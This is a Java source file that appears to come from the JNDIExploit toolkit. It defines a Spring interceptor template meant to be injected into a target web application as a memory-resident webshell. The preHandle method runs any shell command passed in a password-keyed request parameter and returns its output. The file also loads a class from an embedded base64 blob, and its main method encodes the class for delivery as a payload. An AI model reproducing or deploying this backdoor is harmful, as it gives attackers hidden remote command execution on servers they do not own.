package com.feihong.ldap.template;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Scanner;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

@Controller
public class DynamicInterceptorTemplate3 extends HandlerInterceptorAdapter {
    private Class myClassLoaderClazz;
    private String basicCmdShellPwd = "pass";

    public DynamicInterceptorTemplate3() {
        this.initialize();
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("[+] Dynamic Interceptor3 says hello");
        String k;
        if (request.getParameter("type") != null && request.getParameter("type").equals("basic")) {
            k = request.getParameter(this.basicCmdShellPwd);
            if (k != null && !k.isEmpty()) {
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                response.getWriter().println(result);
                return false;
            }
        }

        return true;
    }

    private void initialize() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

            try {
                this.myClassLoaderClazz = classLoader.loadClass("com.feihong.ldap.template.MyClassLoader");
            } catch (ClassNotFoundException var8) {
                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9NeUNsYXNzTG9hZGVyOwEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAC2RlZmluZUNsYXNzAQAsKFtCTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsBAAVieXRlcwEAAltCAQALY2xhc3NMb2FkZXIBAApTb3VyY2VGaWxlAQASTXlDbGFzc0xvYWRlci5qYXZhDAAGAAcBACdjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL015Q2xhc3NMb2FkZXIMAA8AGgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEAAgAFAAAAAAACAAAABgAHAAEACAAAADoAAgACAAAABiortwABsQAAAAIACQAAAAYAAQAAAAQACgAAABYAAgAAAAYACwAMAAAAAAAGAA0ADgABAAkADwAQAAEACAAAAEQABAACAAAAELsAAlkrtwADKgMqvrYABLAAAAACAAkAAAAGAAEAAAAIAAoAAAAWAAIAAAAQABEAEgAAAAAAEAATAA4AAQABABQAAAACABU=";
                byte[] bytes = java.util.Base64.getDecoder().decode(code);    // from base64 string to class bytes
//                Method method = null;
//
//                try {
//                    method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
//                    method.setAccessible(true);
//                    this.myClassLoaderClazz = (Class)method.invoke(classLoader, bytes, 0, bytes.length);
//                } catch (NoSuchMethodException var7) {
//                    var7.printStackTrace();
//                }

//                this.myClassLoaderClazz = sun.misc.Unsafe.getUnsafe().defineClass("com.feihong.ldap.template.MyClassLoader",bytes, 0, bytes.length );
                this.myClassLoaderClazz = java.lang.invoke.MethodHandles.lookup().defineClass(bytes);
                // ref: https://stackoverflow.com/questions/66974846/java-lang-exceptionininitializererror-with-java-16-j-l-classformaterror-access/67006749#67006749
            }
        } catch (IllegalAccessException var9) {
            var9.printStackTrace();
        }

    }

    public static void main(String[] args) {
        byte[] classContent;
        try {
            classContent = Files.readAllBytes(Paths.get("C:\\repos\\JNDIExploit\\target\\classes\\com\\feihong\\ldap\\template\\DynamicInterceptorTemplate3.class"));
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        String base64ClassContent = java.util.Base64.getEncoder().encodeToString(classContent);   // from class content to base64 string.
        System.out.println(base64ClassContent);
    }
}